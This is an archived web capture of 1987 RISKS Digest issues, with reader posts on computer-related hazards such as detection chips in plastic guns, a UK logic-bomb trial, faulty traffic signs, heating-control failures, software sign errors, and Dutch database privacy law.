<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
A new and possibly risky use for computer chips
</A>
</H3>
<address>
John Saponara
&lt;<A HREF="mailto:saponara@tcgould.tn.cornell.edu ">
saponara@tcgould.tn.cornell.edu 
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 12:19:28 EST
</i><PRE>

An interesting use of computer chips was mentioned in "The Christian Science
Monitor" in the November 13, 1987 issue, in an article titled "Showdown takes
shape over plastic weapons":

  Plastic firearms - now being developed for the United States Army by Red Eye
  Arms Inc. - are a bone of contention between antigun organizations and the
  National Rifle Association (NRA).

[The article goes on to tell of the opponents, then continues:]

  "One of the worst nightmares in our fight against terrorism is the
  possibility that airline hijackers could carry plastic guns aboard aircraft
  without detection," says Senator Metzenbaum.  "In order to prevent this
  frightening scenario, we need to act now."

  But David Conover of the NRA says: "Firearms constructed completely out of
  plastic don't exist now."  He argues that a ban on this "future" technology
  does not address the real problem of faulty airport security at the root of
  terrorist activity.

  John Floren, president of Red Eye Arms - which holds the only patent to
  produce such weapons - says the prototype his firm is developing for the
  Army would be entirely plastic but would have computer chips implanted to
  make possible detection of make, model, and serial number from 15 feet away.

[The article goes on to describe the uses of plastic arms and various
legislation concerned with them.]

The idea of adding chips to plastic guns, then selling chip detectors to all
the airport security checkpoints, seems lucrative but does not strike me as the
most sensible approach to the problem.  I have not heard of the use of computer
chips as a detection scheme before.  How foolproof is such a scheme?  If I
stopped sending current to the chip, would the gun then not fire?  Could I
reprogram these chips to have false ID's from other guns, or to not transmit?
Considering the problems the cellular phone companies have had with
reprogrammed phone chips, there seem to be real possibilities of circumventing
such measures.  Does anyone know of any similar detection systems in use at
present, and how secure they are?
                                              Eric Haines

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Selling Science [a review]
</A>
</H3>
<address>
Peter J. Denning 
&lt;<A HREF="mailto:pjd@riacs.edu">
pjd@riacs.edu
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 12:13:26 pst
</i><PRE>

Many RISKS readers have struggled with the question of generating a rational
public debate when complex technical issues are involved.  What follows is a
review of an interesting little book chock full of insights into how science
journalism works and interacts with the scientific research community.  The
author's comments on treatment of risks in the media are particularly
interesting.  I recommend the book highly.   (pjd)

      Selling Science, Dorothy Nelkin, W. H. Freeman, 1987, 224pp.
                  A review by Peter J. Denning

Have you ever wondered about the apparent contradiction between hyperactive
science journalism and extensive scientific illiteracy?  Between the
promotion of technology as the key to progress in society and the growing
fear of technology?  Between the demand for sophisticated science-based
medicine and the widely supported objections to animal experiments?  Between
the rationality of science and expectations of ``magic bullets'' and
``miracle cures''?  Have you ever wondered whether you will be
misrepresented if you talk to a journalist, whether having your research
discussed in Newsweek is essential to your continued funding, or whether
``popularizers'' like Carl Sagan are advancing science?  If you have, you
are not alone.

These questions touch on fundamental issues in science, technology, and the
press.  Dorothy Nelkin has faced them head on in this fascinating book.
With clarity and painstaking documentation she identifies four main
characteristics of science journalism.  First, most articles are high in
imagery and metaphor, and low in technical content.  Many of the images show
science as arcane, esoteric, beyond normal understanding, authorative,
trustworthy, pure, neutral, and the ultimate source of rationality and basic
truth.  High technology is touted as a quick fix to many problems and is the
source of much disillusionment when it fails.  On debates of great
controversy, such as ozone, artificial sweeteners, or dioxin, or strategic
defense, little technical information is given; instead equal time is given
all ``sides'' no matter how irrational they might be from an objective
standpoint.  Second, much of science is portrayed as a series of dramatic
events, rather than the slow, backtracking, plodding process it really is.
Third, there is a strong emphasis on competition -- e.g., the ``race'' for
breakthroughs, the obsessive 90-hour workweeks of Nobel laureates, or the
``technology war'' between the United States and Japan.  Fourth, scientists
have been actively involved in the press; far from being neutral sources,
they have sought favorable coverage of their projects.  Many institutions
have active media programs that have successfully put the most favorable
information out for public consumption, professional societies have advanced
proposals to control the flow of information to the press, and some journals
by policy refuse to publish any finding that has been ``scooped'' in the
public press.  In the midst of this, scientists have ambivalent attitudes
toward the press, at some times seeking it out, at others criticizing it.

These trends emerge from Nelkin's careful analysis of a large number of
scientifc articles published over many years, and they correlate well with
one's own experience.  But the real contribution of the book lies in its
careful, and highly successful attempt to understand the frames of reference
-- the mindsets -- of scientists and of journalists.  Nelkin accurately
describes the style of scientific research, the norms of objectivity
(especially peer review and reproducibility of results), the professional
ideals, the role of technical jargon, and the rules of evidence widely used
in science -- in short, the unspoken culture in which all scientists
operate.  She similarly describes the culture of journalism, including basic
reporting, editorial contraints, audience assumptions, economic pressures,
avoidance of complexity, and vulnerability to sources.  From this it becomes
easy to appreciate the sources of misunderstandings between scientists and
journalists.  When a scientist says there is no (statistically significant)
evidence of a correlation between power-plant radiation and cancer, a
journalist who knows of a few cases of radiation-induced cancer may ``hear''
a coverup; when a scientist says a new drug produced an improvement in a few
AIDS patients, a journalist may ``hear'' that a cure is imminent.  When a
journalist asks probing questions about risks of technology, a scientist may
``hear'' that the journalist is trying to make the evidence fit his own
hidden agenda; when a journalist omits important methodological details
about an experiment, a scientist may ``hear'' an attempt to oversell a
finding to a gullible public.

Nelkin praises efforts to increase mutual cultural understanding between
scientists and journalists, such as formal science training for science
journalists, the Council for Advancement of Science Writers, and the Media
Resource Service of the Scientists Institute for Public Information.
Although the tension can be softened, she says, the two cultures are
inherently different and the tension cannot be wholly eliminated.
Scientists and journalists will have to come to terms with an uneasy,
occasionally adversarial relationship.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Risks to computerised traffic control signs
</A>
</H3>
<address>
Peter McMahon 
&lt;<A HREF="mailto:munnari!uqcspe.cs.uq.oz.au!pete@uunet.UU.NET">
munnari!uqcspe.cs.uq.oz.au!pete@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 13:07:50 est
</i><PRE>

Quoted from "Computing Australia", without permission.  [23 Nov 87]

"Computer-run signs over Canterbury Road in Melbourne's eastern suburbs
 suggested a speed of 75 km/h - in a 60 km/h zone - for a clear run through
 traffic lights.

 Despite the anger of police the mix-up was not solved for three days.

 The 26 electronic signs are part of a new information system devised by the
 Road Traffic Authority (RTA)  [...]

 [An obviously upset!] Chief Superintendent Frank Green of the Victorian
 Police traffic department said: "If these mongrel machines are telling
 people to breach the bloody law we'll have to tell the RTA to take its
 computer and shove it."

 RTA and Mach Systems officials denied any bungled programming and said that 
 only two signs were malfunctioning."

Peter McMahon, Computer Science, University of Queensland, Australia
pete@uqcspe.cs.uq.oz.au

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Risks in Energy Management Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
26 Nov 87 16:07:33 GMT (Thursday)
</i><PRE>
From: Anon @ uk academic establishment

A while back someone asked about risks in Energy Management Systems; well,
here's one that I know of (even though it isn't related to computer rooms,
unlike the original discussion)....

Some time ago I spent about nine months working for a company which 
produces and sells a computer controlled distributed energy management 
system.  It consists of outstations (which can work stand-alone) and a
central operators station.  The centre was running circa 10000 lines of
uncommented, undocumented spaghetti BASIC which had evolved over a
period of years in the care of a couple of self-taught programmers.  The
outstations contained a few thousand lines of commented but undocumented
assembler.  Communication was by reading &amp; writing of memory in the
outstation using explicit memory addresses embedded in the centre software.

[My job was supposed to be to help them do a complete redesign &amp;
reimplementation, but that was 'temporarily' shelved when the
Managing Director realised what it would cost (amongst other reasons)]
 
The standard mechanism for fixing a bug involved someone trying to replicate
it, hacking a fix into a copy of the user's version of the program &amp; then
sending it back to them.  No version control, no replication of fixes across
the user base etc.  Testing involved installation on-site &amp; waiting a day or
two to see if things broke.  The only in-house tests were done by running new
software in the outstation that controlled the company HQ : I've seen clients
sitting in our reception area in hat &amp; coats on a Monday morning (waiting to
see someone) because the heating hadn't switched itself on (there was a warm-up
period so manual over-rides at 8am didn't have much effect until after 10) and
as a result in-house tests were strongly discouraged!

Not surprisingly, crashes were common - especially of the 'centre' - which
was embarrassing since the system - originally designed for control of
heating plant in schools &amp; factory complexes (eg one centre for an education
authority, one outstation per school) - was also being used as heating
control for communal housing projects.

However, the worst incident was in fact hardware related.  UK mains voltage
is 240V +/- a maximum percentage.  The outstations contained a transformer
which would drop out (powering down the system) if the voltage dropped more
then a couple of volts below the (supposedly) absolute minimum, it would only
trip in again at nearly 240V (quite a lot of volts above this minimum).  Last
winter was quite severe over here and there was some strain on the electricity
supply system so it ran at near minimum for extended periods (several hours at
a time) with occasional glitches down to the absolute minimum and (we suspect)
sometimes slightly lower.  Now, when an outstation stopped it halted all of the
pumps, boilers etc that it controlled; ie no heating was provided.

Because of the way power was supplied to an outstation in a communal housing
project it was receiving a couple of volts below the actual mains voltage
and one evening it tripped out.  It didn't trip in again until a LOT of hours
later, by which time all of the housing involved had got very cold.  The
accommodation included some sheltered housing for elderly people one of whom
ended up requiring hospital treatment for hypothermia.  Fortunately for the
company nobody sued and the woman involved recovered (remember that hospital
treatment over here is free so there were no medical bills involved).

This sort of problem was far from unique, it's just that the people who are
buying these systems often don't realise the potential dangers and some
manufacturers are so busy trying to grab a share of the market that they
rush bad &amp;/or untested products to the buyers.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.66.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.68.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-20</DOCNO>
<DOCOLDNO>IA012-000130-B022-241</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.68.html 128.240.150.127 19970217014404 text/html 19263
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:42:36 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 68</TITLE>
<LINK REL="Prev" HREF="/Risks/5.67.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.69.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.67.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.69.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 68</H1>
<H2> Tuesday, 1 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Logic Bomb 
</A>
<DD>
<A HREF="#subj1.1">
Brian Randell
</A><br>
<A HREF="#subj1.2">
 ZZASSGL
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: hyphens &amp; Mariner I 
</A>
<DD>
<A HREF="#subj2.1">
Jerome H. Saltzer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Mariner, and dropped code 
</A>
<DD>
<A HREF="#subj3.1">
Ronald J Wanttaja
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Minuteman and Falling Trucks 
</A>
<DD>
<A HREF="#subj4.1">
Joe Dellinger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Fiber optic tap 
</A>
<DD>
<A HREF="#subj5.1">
Mike Muuss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Garage door openers 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Dutch Database Privacy Laws 
</A>
<DD>
<A HREF="#subj7.1">
Robert Stanley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Logic Bomb
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:br%kelpie.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
br%kelpie.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Fri, 27 Nov 87 10:57:34 GMT
</i><PRE>

Here, in response to Gligor Taskovich's request in RISKS DIGEST 5.65, is an
article on the trial here in the UK relating to a "logic bomb". It comes
from Computer Weekly, November 26, p. 3, and is quoted here in full.  (br)

                    MAN CHARGED WITH PLANTING TIME BOMB

Criminal damage charges have been brought against a computing specialist who
allegedly doctored a customer's software so it would give his firm a contract
to put things right.  James McMahon, 32, from Watford denies four charges of
criminal damage and one attempt at criminal damage to discs and systems
belonging to Pandair Freight, obtaining over (pounds)1,000 from Pandair by
deception for his company, Wendmist, and attempting to obtain (pounds)372.

In January 1986 Pandair's system in Heston, Middlesex, running on a DEC
computer, broke down. Prosecutor David Radcliffe told the court that the
problem was caused by a time bomb, inserted earlier.  The 1985 version would
still work but after McMahon spent time on it things got worse, Radcliffe
said.  McMahon arranged to work on the faults on returning from holiday.
While he was away a Pandair programmer did some tests and found a section of
unauthorised code. "He found the time bomb and defused it," Radcliffe said.
The programmer then looked at a similar system at Pandair's Birmingham office.
Here he found a time bomb which would have erased the computer's memory.

Radcliffe suggested McMahon had acted out of revenge, because he had just
failed to win a (pounds)50,000 contract to update Pandair's system at
Maidenhead.  Pandair says the system problems cost it (pounds)15,000.

This is believed to be only the second case of alleged criminal damage of its
kind.  The first, last year, followed a farewell prank by a Dixons employee
who tried to get the company's mainframe to display "goodbye folks" whenever
his leaving date was entered in staff records. he was conditionally charged
and orderd to pay Dixons (pounds)1,000.
                                               John Kavanagh

</PRE>
<HR><H3><A NAME="subj1.2">
   UK Logic Bomb Case
</A>
</H3>
<address>
"ZZASSGL" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 12:35:49 GMT
</i><PRE>

    [This contribution included TWO news reports, including excerpts
    from the article noted above.  It also commented thereupon.  PGN]

Both reports are somewhat confusing about the actual details, but the basic
facts seem simple.  McMahon did some work on the system, was expecting to
get a contract for more, but didn't. Shortly after the system had problems
and when Pandair programmer investigated he found the ''bombs''. As the case
is still proceeding it is not possible to connect these two facts.

I remember reading an earlier report (I can't find it now) about the
problems that were expected because the jury would have to understand the
background and jargon before being able to decide the case. They were all
provided with a glossary for the technical terms to be used and also given a
one day introduction to computers and DEC systems.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: hyphens &amp; Mariner I
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Sun, 29 Nov 87 01:30:11 EST
</i><PRE>
From: Jerome H. Saltzer &lt;Saltzer@ATHENA.MIT.EDU&gt;

As long as people are still searching for the real story, here is another
possible clue, based on yet another third-hand rumor: Back in 1962, when
Mariner I failed, the story that quickly circulated around M.I.T. was that a
minus sign had been miscoded as a hyphen.  You see, the keypunches in those
days had two different keys with similar-looking graphics, one interpreted as
a minus sign, the other as a hyphen.  The first Fortran compiler accepted only
the minus sign for the subtraction operator.  At one point in the evolution of
that compiler a (fatal!) diagnostic was added to alert you that you had used
the "wrong minus sign," leading to snide comments along the line of "if you're
so smart, why don't you fix it?" and a standard test of skill was to figure
out how to patch the Fortran compiler to accept a hyphen as an alternate minus
sign.  When a hyphen appeared in data, the result depended on the software
that was trying to interpret it; some programs accepted it as an alternate
minus sign, other programs ignored hyphens (effectively reversing the intended
sign), and still other programs blew out with a bad data diagnostic.  Given
that kind of confusion every day in the keypunch room, when the rumor about
Mariner I came through it sounded very plausible.

Whether or not Mariner I was a victim of hyphen/minus-sign confusion, the
keypunches of the late 50's carry a cautionary tale for RISKS readers.

					Jerry Saltzer
      [Hyphen the Terrible?  PGN]
   
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Mariner, and dropped code 
</A>
</H3>
<address>
&lt;<A HREF="mailto:ucbcad!ames.UUCP!uw-beaver!ssc-vax!wanttaja@ucbvax.Berkeley.EDU">
ucbcad!ames.UUCP!uw-beaver!ssc-vax!wanttaja@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Fri, 27 Nov 87 00:25:40 pst
</i><PRE>

I was in a NORAD satellite operations unit for four years, and "I was
there" during several times when erroneous attack warnings were generated.

One sticks in my mind... it wasn't caused by a missing hyphen, or replacing
a period with a comma, but by an INCORRECT VALUE OF *PI*!  I dearly wish I
had bothered to find out what the value had been, but, considering the
circumstances of the error, it probably was in one of the later decimal places.

The system worked as advertised and the attack warning was quickly cancelled.

   [This and Jerry Saltzer's contributions are just two of 
   many that have been backlogged.  More is coming...  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Minuteman and Falling Trucks
</A>
</H3>
<address>
Joe Dellinger 
&lt;<A HREF="mailto:joe@hanauma.STANFORD.EDU">
joe@hanauma.STANFORD.EDU
</A>&gt;
</address>
<i>
Mon, 30 Nov 87 02:46:45 pst
</i><PRE>

	I was curious to find out how often incidents such as the "truck
parked on the missile silo door" one mentioned here really occur, and
how stupid this response really was. As it happens, my brother was until
a few years ago the commander in charge of missiles at a Missouri base.
While the answers to some of my questions were classified, here's what
he said (as I understood it):
	False "launch in progress" status warnings aren't that rare. He
saw about one per year at his base. There is a definite set of procedures
to perform when this happens. Parking a truck on top of the silo door such
that it will fall in on top of the missile if the door opens is one of them.
The people that did this were doing the officially approved thing! The truck
is to be parked such that one set of wheels is on terra firma and the other
set is on the silo door. The truck is to be left in neutral with the parking
brake off. The door itself is designed to open despite any debris on it, and
there is a lip of sorts on the door to keep the debris from falling off the
door and onto the missile. However, this lip can't handle more than a few
inches worth of debris. The truck, properly parked, has no way of riding
the door and will fall something like several hundred feet onto the missile.
The damage thus inflicted should serve to "keep the missile in the hole".
Worst possible outcome (unlikely to happen) is that the missile detonates
its nuclear warhead in the hole, resulting in a quarter-mile wide crater
and some local contamination.
	The silo door can be opened and closed with a hand crank, but even
if you know all the required access codes (which no one person does) you
don't have time to get to the crank before the security people have time
to get to you.
	I've seen a field where missiles are kept. Looked just like any
other farmer's field in the area to me, except that the "keep out" signs
were especially intimidating and there were no cows in it. I was amazed
to discover that the missile field was right next to a state highway!
	- joe@hanauma.stanford.edu

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Re:  Fiber optic tap
</A>
</H3>
<address>
Mike Muuss 
&lt;<A HREF="mailto:mike@BRL.ARPA">
mike@BRL.ARPA
</A>&gt;
</address>
<i>
Tue, 1 Dec 87 16:20:52 EST
</i><PRE>

Your message is neither surprising, nor is it "news".  The device used
by AT&amp;T to splice cables "in the field" has used this principle for
years.  The device is suitcase-sized, rugged, portable, and inexpensive
(&lt; $100k).  It injects a signal on one side of the splice, monitors
the signal on the other side of the splice, and mechanically optimizes
for the maximum transmission through the splice, then heat-welds the
two fibers.  The signal injection and recovery is non-intrusive and non-
damaging, and very very easy.

Dr. Steve Wolff (now of NSF, formerly of BRL) jointly holds a patent for
a spatial light modulation technique that renders this type of tapping
useless.  However, to my knowledge, there are no production modulators
that embody this technique.

In summary, only physical security and encryption provide acceptable security 
for important transmissions.
                      	     -Mike Muuss, Advanced Computer Systems Team, BRL

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Garage Door Openers
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 27 Nov 87 12:33:09 EST
</i><PRE>

&gt; An Army spokesperson denies that the Army is radiating anything that 
&gt; would lock up these receivers.

What they may actually have said, or meant to say, is that they are not
radiating anything that *should* lock up those receivers.  Much consumer
electronic equipment is cheaply (in both senses of the word) designed and
is very vulnerable to interference from signals that theoretically it should
ignore.  Things like ham-radio transmissions interfering with TV reception
are often the fault of the TV set, not the perfectly-legal-and-proper radio
transmitter.  The problem actually is not restricted to consumer equipment;
things like police radars are often rather unselective as well.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Dutch Database Privacy Laws
</A>
</H3>
<address>
Robert Stanley 
&lt;<A HREF="mailto:roberts%cognos%math.waterloo.edu@RELAY.CS.NET">
roberts%cognos%math.waterloo.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 27 Nov 87 19:50:18 GMT

The following is an extract from a recent posting to comp.society.futures.
This is a very advanced approach to the problem, and it would be extremely
interesting to have more detail on the law in question.  The issue of
implementation is not totally resolved, however.  I assume that the law
requires each GOAL to be registered, and that some agency is empowered to
audit and/or investigate (the latter only in the event of reasonable
suspicion of misuse).  But how do we prevent the meta-database of database
GOALS from being misused - quis custodiet ipsos custodes remains true as the
day it was written.

| From: FRUIN@HLERUL5.BITNET.UUCP
| Newsgroups: comp.society.futures
| Subject: Filtering A Global Hypermedia Network
| Organization: The ARPA Internet
| Posted: Fri Nov 20 08:18:00 1987
| 
| In Holland a new law will soon take effect regarding databases that store
| information about people.  It's basic premise is that a database should have
| a GOAL, i.e. to send you your electricity bill or to keep track of your car's
| registration number.  It is FORBIDDEN two match or combine any two databases
| that don't have the same goal.  You can take anybody to court who does so
| anyway. This should make it very hard for corporations and government agencies
| to access any information about you.
| 
| -- Thomas Fruin
| 
|    fruin@hlerul5.BITNET
|    thomas@uvabick.UUCP
|    2:500/15 on FidoNet
| 
|    Leiden University, Netherlands

On a slightly different subject, I am becoming increasingly aware of a new
computer-related problem which may yet develop into a full-blown risk.  In our
working environment we are pretty well established as workstation-per-user, and
the technology of networking means that it is sometimes easier to relocate
people rather than reconfigure electronic offices.  We have a fair number of
tools for which we have site licenses limiting us to x copies (x &lt;= 5 for our
group of 18 is typical).  What we want is ability to run no more than 5
simultaneous copies at any of 18 workstations, what we have is software enabled
on 5 specific workstations.  Not only is this damnably awkward at times, but it
can introduce a number of problems.

First of all, there is the classic problem of protected software.  We use Sun/3
workstations, and the first engineering response to problems is swap out the
processor board (our workstations are single-board).  At this point we are in
the identical position of the person who has irretrievably damaged their
key-disk for a copy-protected micro product, because the workstation's serial
number has changed.  We have a company policy that pretty much says that no
critical data will be dependent on a program for which we cannot generate
replacement/alternate versions in case of emergency.

The second problem is when installation of software changes the workstation in
subtle but important ways.  When people shift workstations in order to access
one of these restricted applications, the displaced owner can find him/herself
misusing the (temporary) alternate environment.  Once you have worked for a
while on a configurable workstation, you rapidly forget how much of its
behaviour is default, and how much is your customizing.  Until, that is, you
find yourself in an environment which appears almost the same, but behaves
drastically differently in some key and unobvious fashion.  Of course, there
are ways round this, but the problem is a direct result of lazy or sloppy
thinking on the part of the application vendor.

The vendor solution is to have a copy of their software on every workstation,
but that is a totally unacceptable solution from the cost standpoint unless
some massive price breaks are introduced.  Interestingly, as standards such as
X come into common implementation, we may end up remote-logging-in to a
software server to which such tools are licensed, with X supplying the full
interactive graphic windowing capability at the remote workstation.  Back to
the days of time-sharing a central computer!

R.A. Stanley             Cognos Incorporated     S-mail: P.O. Box 9707
Voice: (613) 738-1440 (Research: there are 2!)           3755 Riverside Drive 
  FAX: (613) 738-0002    Compuserve: 76174,3024          Ottawa, Ontario 
 uucp: decvax!utzoo!dciem!nrcaer!cognos!roberts          CANADA  K1G 3Z4

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.67.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.69.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-21</DOCNO>
<DOCOLDNO>IA012-000130-B022-250</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.69.html 128.240.150.127 19970217014420 text/html 31155
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:42:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 69</TITLE>
<LINK REL="Prev" HREF="/Risks/5.68.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.70.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.68.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.70.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 69</H1>
<H2> Friday, 4 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Can you sue an expert system? 
</A>
<DD>
<A HREF="#subj1.1">
Barry A. Stevens
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of Portable Computers 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Beware the Temporary Employee 
</A>
<DD>
<A HREF="#subj3.1">
Howard Israel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Truncated anything 
</A>
<DD>
<A HREF="#subj4.1">
Doug Mosher
</A><br>
